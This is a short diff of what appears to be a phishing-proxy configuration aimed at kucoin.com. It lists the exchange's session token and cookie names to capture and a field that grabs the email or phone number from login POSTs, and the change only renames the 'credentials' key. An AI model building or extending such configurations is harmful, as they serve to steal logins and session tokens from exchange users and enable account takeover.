@@ -27,7 +27,7 @@ auth_tokens:
   - domain: 'kucoin.com'
     keys: ['x-bullet-token, kucoinv2_bulletTokenKeyPrivate, kucoinv2_bulletTokenUidKey, kucoinv2_clientId, kucoinv2_login_key']
 
-credentials:
+creds:
   - key: 'Email/Phone Number'
     search: ['(.*)']
     type: 'post'
